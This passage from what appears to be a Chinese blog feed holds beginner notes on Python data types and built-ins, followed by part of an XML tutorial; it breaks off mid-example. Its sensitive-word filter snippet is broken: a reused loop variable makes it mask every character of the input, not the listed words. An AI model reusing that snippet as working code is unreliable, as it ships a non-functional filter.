</p><p><strong>注</strong>：在%后面要用特定的字符来表示不同类型的变量%s表示字符型变量%d表示数值型变量%f表示浮点型变量</p></li><li><p>format()%占位符的方式要刻意区分变量类型，format()方法就不用考虑变量类型 name &#x3D; ‘psych’<br> score &#x3D; 99.6<br> s &#x3D; ‘Hi,{0} .Your score is {1}’.format(name, score)<br> print(s)  </p><p><strong>注</strong>：用format()方法也可以指定化简的小数位数<code>s = &#39;Hi,&#123;0&#125; .Your score is &#123;1:.2f&#125;&#39;.format(name, score)</code> 也就是**{1:.2f}**</p></li><li><p>f_string() <python3>在字符串前面加上前缀f，并将变量名称用大括号包括起来，python就可以自动识别并引用变量 name &#x3D; ‘psych’<br> score &#x3D; 99.6<br> s &#x3D; f’Hi,{name} .Your score is {score}’<br> print(s)</p></li></ul><h4 id="列表-1"><a href="#列表-1" class="headerlink" title="列表"></a>列表</h4><h5 id="list-函数"><a href="#list-函数" class="headerlink" title="list()函数"></a>list()函数</h5><p>list()函数可以将字符串，元组，range对象等等可迭代对象转换为列表。</p><p><strong>列表属于可变序列，里面的元素是可以变的</strong></p><p><strong>列表可以存储不同类型的数据</strong></p><blockquote><p>range()函数默认返回的是一个range对象，用list函数可以将它转换成列表</p><p> print(range(1, 5))                            #range(1, 5)<br> print(list(range(1, 5)))                      #[1, 2, 3, 4]</p></blockquote><p>e.g：写一个包含所有小写字母的列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> print(list(map(chr, range(ord(&#x27;a&#x27;), (ord(&#x27;z&#x27;) + 1)))))</span><br></pre></td></tr></table></figure><h5 id="常用函数和方法-1"><a href="#常用函数和方法-1" class="headerlink" title="常用函数和方法"></a>常用函数和方法</h5><ul><li>sum()用于求和 b &#x3D; list(range(1, 101))<br> print(sum(b))         # 5050</li><li>map()把一个函数依次映射到序列的每个元素上，并返回一个map对象最为结果。map对象中每个元素是原序列中元素经过函数处理后的结果所以为了直观，一般把map()对象转换成列表 a &#x3D; [‘12341’, ‘121’, ‘123’, ‘465’]<br> print(map(int, a))                    #&lt;map object at 0x000001EADF8967A0&gt;<br> print(list(map(int, a)))              #[12341, 121, 123, 465]</li><li>apend()向列表尾部追加一个元素</li><li>extend()将另一个列表中所有元素追加到当前列表的尾部，通过这种方法可以在列表尾部追加多个元素 a &#x3D; [‘1’, ‘2’, ‘3’, ‘4’]<br> a.append(‘5’)<br> print(a)             #[‘1’, ‘2’, ‘3’, ‘4’, ‘5’]<br> a.extend([‘6’, ‘7’, ‘8’, ‘9’, ‘10’])<br> print(a)             #[‘1’, ‘2’, ‘3’, ‘4’, ‘5’, ‘6’, ‘7’, ‘8’, ‘9’, ‘10’]<strong>注</strong>:不能直接<code>print(a.append(1))</code>，这两个函数都是对原来的列表进行修改操作，<strong>没有返回值</strong>，而是直接把a的元素改变了</li><li><code>sort(),reverse()</code><ul><li>sort()方法可以将列表中元素进行排序，默认升序</li><li>reverse()方法可以将列表中元素顺序颠倒，也就是逆序<strong>注</strong>：这两种方法属于原地操作，经过排序之后，列表中元素原来的顺序全部丢失sort()函数和sorted()方法，一个是原地操作，一个是产生新的列表 a &#x3D; [5, 2, 0, 13, 14]<br> a.sort()<br> print(a)          #[0, 2, 5, 13, 14]<br> ​<br> a &#x3D; [5, 2, 0, 13, 14]<br> sorted(a)<br> print(a)          #[5, 2, 0, 13, 14]</li></ul></li></ul><h5 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h5><ul><li>列表推导式，也叫列表解析式，可以使用非常简洁的方式快速生成满足特定需求的列表</li><li><code>[表达式 for 变量 in 序列或可迭代对象 if 条件表达式]</code></li></ul><p>e.g1:达到字符串”hello”中每个字符ASCII码值，放到列表中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> a = []</span><br><span class="line"> for i in &#x27;hello&#x27;:</span><br><span class="line">     a.append(ord(i))</span><br><span class="line"> print(a)      #[104, 101, 108, 108, 111]</span><br><span class="line"> #更简单的写法</span><br><span class="line"> a = [ord(i) for i in &#x27;hello&#x27;]    [表达式 for 变量 in 序列或可迭代对象 if 条件表达式]</span><br><span class="line"> print(a)      #[104, 101, 108, 108, 111]</span><br><span class="line"> #或者直接一步到位</span><br><span class="line"> print([ord(i) for i in &#x27;psych&#x27;])</span><br></pre></td></tr></table></figure><p>e.g2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> #阿凡提可以获得多少米</span><br><span class="line"> a = [2**(i-1) for i in range(1, 65)]</span><br><span class="line"> flag = 0</span><br><span class="line"> for i in a:</span><br><span class="line">     flag = flag + i</span><br><span class="line"> print(flag)             #18446744073709551615</span><br><span class="line"> ​</span><br><span class="line"> #pythonic</span><br><span class="line"> print(sum([2**(i-1) for i in range(1, 65)]))     #18446744073709551615</span><br></pre></td></tr></table></figure><p>也可以在推导式后面加上<strong>if</strong>进行条件过滤<code>[i for i in a if i &gt; 0]</code>,就可以筛选出 i&gt;0 的元素</p><h4 id="元组-1"><a href="#元组-1" class="headerlink" title="元组"></a>元组</h4><ul><li>元组和列表类似，不同之处在于元组中的数据只能被调用，不能被修改，元组用(）表示。[一旦想要修改就会报错]</li><li>元组内部的元素也可以是不同类型的<code>a = (1, &#39;abc&#39;, &#39;74&#39;)</code></li><li>如果只有一个元素，需要在元素后面加逗号<code>a = (1, )</code></li><li>使用tuple()函数可以将其他序列转换为元组 a &#x3D; ‘psych’<br> print(tuple(a))         #(‘p’, ‘s’, ‘y’, ‘c’, ‘h’)<strong>通过tuple函数可以实现将列表冻结，而list函数可以实现将元组融化</strong></li><li>元组访问和处理数据比列表更快，数据很大的情况下用元组效率会更高</li><li>元组也经常用于函数传递参数，从而防止在函数中修改元组</li></ul><p>e.g:过滤敏感词</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> key = (&#x27;非法&#x27;, &#x27;暴力&#x27;, &#x27;攻击&#x27;)</span><br><span class="line"> txt = input(&#x27;请输入你的昵称：&#x27;)</span><br><span class="line"> for i in key:</span><br><span class="line">     for i in txt:</span><br><span class="line">         txt = txt.replace(i, &#x27;***&#x27;)</span><br><span class="line"> print(txt)</span><br></pre></td></tr></table></figure><h4 id="字典-1"><a href="#字典-1" class="headerlink" title="字典"></a>字典</h4><ul><li>字典中每个元素包含键和值两个部分，键和值之间用冒号间隔，不同元素之间用逗号间隔，所有的元素被放在一对{ }中。<code>services = &#123;&#39;ftp&#39;: 21,&#39;ssh&#39;: 22,;&#39;http&#39;: 80&#125;</code></li><li>字典中的元素没有索引编号，比如要引用services字典中的第一个元素的值，用services[0]表示就是错误的。<code>service[&#39;http&#39;]</code></li><li>字典中键是不能改变的，值是可以改变的</li></ul><h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><ul><li>keys()keys()方法可以返回字典中所有的键 services &#x3D; {‘ftp’: 21, ‘ssh’: 22, ‘http’: 80}<br> print(services.keys())      #dict_keys([‘ftp’, ‘ssh’, ‘http’])</li><li>values()values()方法可以返回字典中所有的值 services &#x3D; {‘ftp’: 21, ‘ssh’: 22, ‘http’: 80}<br> print(services.values())             #dict_values([21, 22, 80])</li><li>items()items()方法可以返回字典中所有元素</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> services = &#123;&#x27;ftp&#x27;: 21, &#x27;ssh&#x27;: 22, &#x27;http&#x27;: 80&#125;</span><br><span class="line"> print(services.items())     #dict_items([(&#x27;ftp&#x27;, 21), (&#x27;ssh&#x27;, 22), (&#x27;http&#x27;, 80)])</span><br></pre></td></tr></table></figure><ul><li>dict()函数用来创建字典<code>service = dict(ftp=21, ssh=22, http=80)</code></li><li>zip()函数<strong>zip()</strong> 函数用于将可迭代的对象作为参数，将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的列表。结合dict()函数来创建字典 a &#x3D; [‘ftp’, ‘ssh’, ‘http’]<br> b &#x3D; [21, 22, 80]<br> service &#x3D; dict(zip(a, b))<br> print(service)            #{‘ftp’: 21, ‘ssh’: 22, ‘http’: 80}</li><li>pop()和clesr()方法pop方法可以删除字典中指定键所对应的元素<code>service.pop(&#39;ftp&#39;)</code></li><li>clear()方法可以清空字典中的所有元素<code>services.clear()</code></li><li>get()方法获取键对应的值，如果不存在该键，不会报错会没有回显。不用get()方法直接获取<code>service(&#39;https&#39;)</code>就会报错</li></ul><h4 id="集合-1"><a href="#集合-1" class="headerlink" title="集合"></a>集合</h4><ul><li>集合的底层是字典，集合中的所有元素就是字典中的键，所以集合最主要的特点就是其中的元素不能重复</li><li>集合也采用{}表示，集合中的元素是无序的。【看成只有键没有值的字典】</li><li>用set()函数可以将其他对象转换成集合【可以去重！】 a &#x3D; {21, 22, 80, 8080}<br> b &#x3D; [2, 3, 4, 5]<br> print(set(‘hello’))           #{‘h’, ‘l’, ‘o’, ‘e’}     每次顺序不一样，无序的<br> print(set(b))                 #{2, 3, 4, 5}       这个顺序是一样的</li><li>集合可以计算并集交集差集</li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230107011731193.png"></p><h4 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h4><ul><li>二进制：以0b作为前缀，0b1010</li><li>八进制：以0o作为前缀，0o173</li><li>十六进制：以0x作为前缀，0x1f</li></ul><p>用print函数输出这些带前缀的数据，就可以转换成十进制</p><p>python内置函数<code>bin(),oct(),hex()</code>分别用来将十进制数据转换成<code>二进制，八进制，十六进制</code>。</p><h5 id="int函数"><a href="#int函数" class="headerlink" title="int函数"></a>int函数</h5><p>也可以将其他进制的数据转换成十进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> int(被转换的数据(字符串),原始进制)</span><br><span class="line"> #例如:</span><br><span class="line"> print(int(&#x27;2a&#x27;,16))   #42</span><br></pre></td></tr></table></figure><h4 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h4><p>ASCII码，美国标准信息交换码</p><ul><li>linux自带，<code>man ascii</code> 就可以查ASCII表</li></ul><p>关于ASCII的函数</p><ul><li>ord()可以返回某个字符对应的ASCII码(十进制)</li><li>chr()可以返回某个十进制数对应的ASCII码字符</li></ul><h4 id="一些杂乱知识点"><a href="#一些杂乱知识点" class="headerlink" title="一些杂乱知识点"></a>一些杂乱知识点</h4><h5 id="round"><a href="#round" class="headerlink" title="round"></a>round</h5><p>四舍五入</p><p>用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> round(num1,num2)</span><br><span class="line"> #num1:要四舍五入处理的小数</span><br><span class="line"> #num2:四舍五入的位数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230102013837169.png"></p><h5 id="range"><a href="#range" class="headerlink" title="range"></a>range</h5><p>规定区间，进行遍历</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> for i in range(1, 10):</span><br><span class="line">     print(i)</span><br><span class="line"> #会输出1，2，3，4，5，6，7，8，9[也是左闭右开咯)</span><br></pre></td></tr></table></figure><p>如果</p><ul><li>range(10)，默认从0开始，到9</li><li>range(1,10,2) ,从1开始，每间隔两个输出，9停止</li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML</title>
      <link href="/2023/05/14/xml/"/>
      <url>/2023/05/14/xml/</url>
      
        <content type="html"><![CDATA[<p><strong>可扩展标记语言</strong>（英语：E<strong>x</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage，简称：<strong>XML</strong>），是一种标记语言（类似于HTML）。XML是从标准通用标记语言（SGML）中简化修改出来的。</p><p>XML<strong>没有使用预定义的标记</strong>，因此使用者可以根据自己的设计需求定义专属个人的标记。这是一种十分有用的可存储、可搜索和可共享的格式存储数据的方法。最重要的是，因为 XML 的基本格式是<strong>标准化</strong>的，所以如果您跨系统或平台共享或传输 XML，无论是在本地还是在互联网上，接收方仍然可以根据标准化的 XML 语法解析数据。</p><p>XML被设计用来<strong>传输和存储数据</strong>，不用于表现和展示数据，HTML则用来表现数据</p><h2 id="XML用途"><a href="#XML用途" class="headerlink" title="XML用途"></a>XML用途</h2><ul><li>XML把主句从HTML中分离 （数据存储在独立的XML文件中，通过js读取）</li><li>XML简化数据共享（纯文本格式存储方式）</li><li>XML简化数据传输 （XML可以通过各种不兼容的应用程序来读取数据）</li><li>XML 简化平台变更</li><li>XML 使您的数据更有用</li><li>XML 用于创建新的互联网语言（很多新的互联网语言都是XML实现的）</li></ul><h2 id="XML实例"><a href="#XML实例" class="headerlink" title="XML实例"></a>XML实例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        //第一行以XML声明开始，用来表述文档里的一些信息</span><br><span class="line"> &lt;site&gt;</span><br><span class="line">   &lt;name&gt;psych&lt;/name&gt;</span><br><span class="line">   &lt;url&gt;https://www.psych.com&lt;/url&gt;</span><br><span class="line">   &lt;logo&gt;psych-logo.png&lt;/logo&gt;</span><br><span class="line">   &lt;desc&gt;hacker&lt;/desc&gt;</span><br><span class="line"> &lt;/site&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;NAME&gt;,&lt;URL&gt;,&lt;LOGO&gt;,&lt;DESC&gt;</code>分别为标签，标签内包含了<strong>要传递</strong>的信息。。</p><p>标签<strong>必须</strong>成对出现，有开始标签就需要有结束标签（# 注意这一点和HTML不同），例如：</p><ul><li>开始标签：<name></li><li>结束标签：</name></li></ul><h2 id="XML树结构"><a href="#XML树结构" class="headerlink" title="XML树结构"></a>XML树结构</h2><p>XML 文档形成了一种树结构，它**从”根部”开始，然后扩展到”枝叶”**。</p><p>对于上面的这个实例：</p><p>第一行是XML <strong>声明</strong>。它定义 XML 的版本（1.0）和所使用的编码（UTF-8 : 万国码, 可显示各种语言）；</p><p>下一行描述文档的<strong>根元素</strong>，<code>&lt;site&gt;</code>说明这个文本档是一个网站；</p><p>接下来四行描述根的 4 个<strong>子元素</strong>：<code>&lt;name&gt;&lt;url&gt;&lt;logo&gt;&lt;desc&gt;</code></p><p>最后一行定义根元素的结尾</p><p><strong>模板</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> # 所有的元素都可以有子元素</span><br><span class="line"> &lt;root&gt;</span><br><span class="line"> &lt;child&gt;</span><br><span class="line"> &lt;subchild&gt;.....&lt;/subchild&gt;</span><br><span class="line"> &lt;/child&gt;</span><br><span class="line"> &lt;/root&gt;</span><br></pre></td></tr></table></figure><p>用XML表示一些书：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> # 所有的元素都可以有文本内容和属性（类似 HTML 中）。</span><br><span class="line"> &lt;bookstore&gt;</span><br><span class="line">     &lt;book category=&quot;COOKING&quot;&gt;</span><br><span class="line">         &lt;title lang=&quot;en&quot;&gt;Everyday Italian&lt;/title&gt;</span><br><span class="line">         &lt;author&gt;Giada De Laurentiis&lt;/author&gt;</span><br><span class="line">         &lt;year&gt;2005&lt;/year&gt;</span><br><span class="line">         &lt;price&gt;30.00&lt;/price&gt;</span><br><span class="line">     &lt;/book&gt;</span><br><span class="line">     &lt;book category=&quot;CHILDREN&quot;&gt;</span><br><span class="line">         &lt;title lang=&quot;en&quot;&gt;Harry Potter&lt;/title&gt;</span><br><span class="line">         &lt;author&gt;J K. Rowling&lt;/author&gt;</span><br><span class="line">         &lt;year&gt;2005&lt;/year&gt;</span><br><span class="line">         &lt;price&gt;29.99&lt;/price&gt;</span><br><span class="line">     &lt;/book&gt;</span><br><span class="line">     &lt;book category=&quot;WEB&quot;&gt;</span><br><span class="line">         &lt;title lang=&quot;en&quot;&gt;Learning XML&lt;/title&gt;</span><br><span class="line">         &lt;author&gt;Erik T. Ray&lt;/author&gt;</span><br><span class="line">         &lt;year&gt;2003&lt;/year&gt;</span><br><span class="line">         &lt;price&gt;39.95&lt;/price&gt;</span><br><span class="line">     &lt;/book&gt;</span><br><span class="line"> &lt;/bookstore&gt;</span><br></pre></td></tr></table></figure><h2 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h2><ul><li>XML文档必须有根元素，声明</li><li>XML都是双标签，都必须正确嵌套</li><li><strong>XML对大小写敏感</strong></li><li>XML属性值必须加引号  <note date="12/11/2007">     &#x2F;&#x2F;data后面的属性值必须引号包围<br> <to>Tove</to><br> <from>Jani</from><br> </note></li><li>XML中一些特殊字符例如 ‘&lt;’ 如果要放到XML元素中会发生错误【甚至产生漏洞】，使用时必须实体引用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> &lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;     //错误</span><br><span class="line"> &lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt;   //正确  [实体符号和html相同]    </span><br></pre></td></tr></table></figure><ul><li>XML中括号会被保留【而HTML中多个连续括号会被裁剪为一个】</li><li>注释 <!-- This is a comment --></li><li><strong>XML 以 LF 存储换行</strong>在 Windows 应用程序中，换行通常以一对字符来存储：回车符（CR）和换行符（LF）。在 Unix 和 Mac OSX 中，使用 LF 来存储新行。在旧的 Mac 系统中，使用 CR 来存储新行。XML 以 LF 存储换行。</li></ul><h2 id="xml元素"><a href="#xml元素" class="headerlink" title="xml元素"></a>xml元素</h2><p>XML 元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。</p><p>一个元素可以包含：</p><ul><li>其他元素</li><li>文本</li><li>属性</li><li>或混合以上所有…</li></ul><p>借用上面一些书的实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> # 所有的元素都可以有文本内容和属性（类似 HTML 中）。</span><br><span class="line"> &lt;bookstore&gt;                          &lt;!-- （根元素中间包含的） -》 其他元素--&gt;</span><br><span class="line">     &lt;book category=&quot;CHILDREN&quot;&gt;       &lt;!--（category=&quot;CHILDREN&quot;）-》属性 --&gt;       </span><br><span class="line">         &lt;title lang=&quot;en&quot;&gt;Harry Potter&lt;/title&gt;       &lt;!-- （Harry Potter） -&gt; 文本 --&gt;</span><br><span class="line">         &lt;author&gt;J K. Rowling&lt;/author&gt;</span><br><span class="line">         &lt;year&gt;2005&lt;/year&gt;</span><br><span class="line">         &lt;price&gt;29.99&lt;/price&gt;</span><br><span class="line">     &lt;/book&gt;</span><br><span class="line">     &lt;book category=&quot;WEB&quot;&gt;</span><br><span class="line">         &lt;title lang=&quot;en&quot;&gt;Learning XML&lt;/title&gt;</span><br><span class="line">         &lt;author&gt;Erik T. Ray&lt;/author&gt;</span><br><span class="line">         &lt;year&gt;2003&lt;/year&gt;</span><br><span class="line">         &lt;price&gt;39.95&lt;/price&gt;</span><br><span class="line">     &lt;/book&gt;</span><br><span class="line"> &lt;/bookstore&gt;</span><br></pre></td></tr></table></figure><p>在这个实例中，<code>&lt;bookstore&gt;</code> 和 <code>&lt;book&gt;</code>都有 <strong>元素内容</strong>，因为他们包含其他元素。<code>&lt;book&gt;</code>元素也有<strong>属性</strong>（category&#x3D;”CHILDREN”）。<code>&lt;title&gt;</code>、<code>&lt;author&gt;</code>、<code>&lt;year&gt;</code> 和 <code>&lt;price&gt;</code> 有<strong>文本内容</strong>，因为他们包含文本。</p><h2 id="XML属性"><a href="#XML属性" class="headerlink" title="XML属性"></a>XML属性</h2><p>先回顾HTML中的属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> &lt;img src=&quot;computer.gif&quot;&gt;</span><br><span class="line"> &lt;a href=&quot;demo.html&quot;&gt;  </span><br><span class="line"> &lt;!--属性提供了元素的额外信息--&gt;</span><br></pre></td></tr></table></figure><p>XML中属性的作用与其类似，不过XML属性必须用<strong>引号包裹</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;person sex=&quot;female&quot;&gt;   //单引号双引号都可以</span><br><span class="line">  &lt;!--如果属性本身有引号可以采用</span><br><span class="line"> &#123;</span><br><span class="line"> 1.单引号里面套双引号： &lt;gangster name=&#x27;George &quot;Shotgun&quot; Ziegler&#x27;&gt;</span><br><span class="line"> 2.使用实体字体：       &lt;gangster name=&quot;George &amp;quot;Shotgun&amp;quot; Ziegler&quot;&gt;</span><br><span class="line"> &#125;--&gt;</span><br></pre></td></tr></table></figure><p>由于XML可以自定义任何标记，属性有时候也可以成为元素。不过在XML中建议能变成元素的信息都设置成元素。而有一些例如id等元数据【有关数据的数据】，还是建议定义成属性。</p><h2 id="XML与css"><a href="#XML与css" class="headerlink" title="XML与css"></a>XML与css</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?xml-stylesheet type=&quot;text/css&quot; href=&quot;a01.css&quot;?&gt;</span><br><span class="line"> &lt;!--写在声明的下面，把 XML 文件链接到 CSS 文件--&gt;</span><br></pre></td></tr></table></figure><p>不过这不是被推荐的做法。使用XSLT是更被推荐的做法</p><h2 id="XML与XSLT"><a href="#XML与XSLT" class="headerlink" title="XML与XSLT"></a>XML与XSLT</h2><h5 id="使用XSLT显示XML"><a href="#使用XSLT显示XML" class="headerlink" title="使用XSLT显示XML"></a>使用XSLT显示XML</h5><p>XSLT 是首选的 <strong>XML 样式表语言</strong>。</p><p>XSLT（eXtensible Stylesheet Language Transformations）远比 CSS 更加完善。</p><p>XSLT 是在浏览器显示 XML 文件之前，先把它转换为 HTML：</p><h5 id="在服务器上通过-XSLT-转换-XML"><a href="#在服务器上通过-XSLT-转换-XML" class="headerlink" title="在服务器上通过 XSLT 转换 XML"></a>在服务器上通过 XSLT 转换 XML</h5><p>当浏览器读取 XML 文件时，XSLT 转换是由浏览器完成的。</p><p>在使用 XSLT 来转换 XML 时，不同的浏览器可能会产生不同结果。为了减少这种问题，可以在服务器上进行 XSLT 转换。</p><h2 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h2><p><strong><code>XMLHttpRequest</code>（XHR）对象用于与服务器交互</strong>。通过 XMLHttpRequest 可以在不刷新页面的情况下请求特定 URL，获取数据。这允许网页在不影响用户操作的情况下，更新页面的局部内容。<code>XMLHttpRequest</code> 在 AJAX 编程中被大量使用。</p><p>XHR就是一个浏览器的<strong>接口</strong>。而XHR对象用于幕后与服务器交互数据。通俗一点就是一种<strong>拿取数据的规则</strong></p><h5 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h5><p>XHR对象中有很多方法：</p><blockquote><p>为了发送一个请求到服务器，我们使用 XMLHttpRequest 对象的 open() 和 send() 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> xmlhttp.open(&quot;GET&quot;,&quot;xmlhttp_info.txt&quot;,true);</span><br><span class="line"> xmlhttp.send();</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221202011016718-1024x351.png"></p><p>XHR对象中还有很多属性：</p><h5 id="从服务端获取响应"><a href="#从服务端获取响应" class="headerlink" title="从服务端获取响应"></a>从服务端获取响应</h5><blockquote><p>如需从服务器获取响应，请使用 XMLHttpRequest 对象的 responseText 或 responseXML 属性。</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221202011125396-1024x136.png"></p><p> document.getElementById(“myDiv”).innerHTML&#x3D;xmlhttp.responseText;</p></blockquote><p>参考链接：</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest">https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest</a></p><p><a href="https://www.runoob.com/dom/dom-httprequest.html">https://www.runoob.com/dom/dom-httprequest.html</a></p><h2 id="XML应用程序"><a href="#XML应用程序" class="headerlink" title="XML应用程序"></a>XML应用程序</h2><p>粘一个简单的程序，实现从元素中提取子元素的数据并显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> x=xmlDoc.getElementsByTagName(&quot;CD&quot;);</span><br><span class="line"> i=0;</span><br><span class="line"> ​</span><br><span class="line"> function displayCD()</span><br><span class="line"> &#123;</span><br><span class="line"> artist=(x[i].getElementsByTagName(&quot;ARTIST&quot;)[0].childNodes[0].nodeValue);</span><br><span class="line"> title=(x[i].getElementsByTagName(&quot;TITLE&quot;)[0].childNodes[0].nodeValue);</span><br><span class="line"> year=(x[i].getElementsByTagName(&quot;YEAR&quot;)[0].childNodes[0].nodeValue);</span><br><span class="line"> txt=&quot;Artist: &quot; + artist + &quot;&lt;br /&gt;Title: &quot; + title + &quot;&lt;br /&gt;Year: &quot;+ year;</span><br><span class="line"> document.getElementById(&quot;showCD&quot;).innerHTML=txt;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221202012243236-1024x283.png"></p><h2 id="XML命名空间"><a href="#XML命名空间" class="headerlink" title="XML命名空间"></a>XML命名空间</h2><p>同时使用多个XML文档的时候，有可能出现不同文档中的元素重名的情况，使用前缀可以很好的解决这个问题。使用前缀的语法 <code>&lt;前缀:元素名&gt;</code></p><blockquote><p>当在 XML 中使用前缀时，一个所谓的用于前缀的<strong>命名空间</strong>必须被定义。</p><p>命名空间是在元素的开始标签的 <strong>xmlns 属性</strong>中定义的。</p><p>命名空间声明的语法如下。xmlns:_前缀_=“<em>URI</em>“。</p><p>命名空间，可以在他们<strong>被使用的元素中</strong>或者在 <strong>XML 根元素</strong>中声明</p></blockquote><p>例如：(下面的实例实在被使用的元素中声明的命名空间，也可以在根元素)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> &lt;root&gt;</span><br><span class="line"> ​</span><br><span class="line"> &lt;h:table xmlns:h=&quot;http://www.w3.org/TR/html4/&quot;&gt;</span><br><span class="line"> &lt;h:tr&gt;</span><br><span class="line"> &lt;h:td&gt;Apples&lt;/h:td&gt;</span><br><span class="line"> &lt;h:td&gt;Bananas&lt;/h:td&gt;</span><br><span class="line"> &lt;/h:tr&gt;</span><br><span class="line"> &lt;/h:table&gt;</span><br><span class="line"> ​</span><br><span class="line"> &lt;f:table xmlns:f=&quot;http://www.w3cschool.cc/furniture&quot;&gt;</span><br><span class="line"> &lt;f:name&gt;African Coffee 